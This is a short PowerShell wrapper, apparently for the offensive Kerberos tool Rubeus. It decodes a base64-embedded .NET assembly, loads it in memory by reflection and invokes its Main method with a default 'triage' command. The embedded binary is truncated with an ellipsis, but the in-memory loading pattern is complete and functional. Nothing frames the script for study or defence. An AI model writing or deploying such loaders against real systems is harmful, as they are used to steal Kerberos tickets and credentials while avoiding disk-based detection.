function Invoke-Rubeus
{
    param([String]$Command = 'triage')
    $b64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAA...'
    $bytes = [System.Convert]::FromBase64String($b64)
    $asm = [System.Reflection.Assembly]::Load($bytes)
    $asm.GetType('Rubeus.Program').GetMethod('Main').Invoke($null, @(, $Command))
}
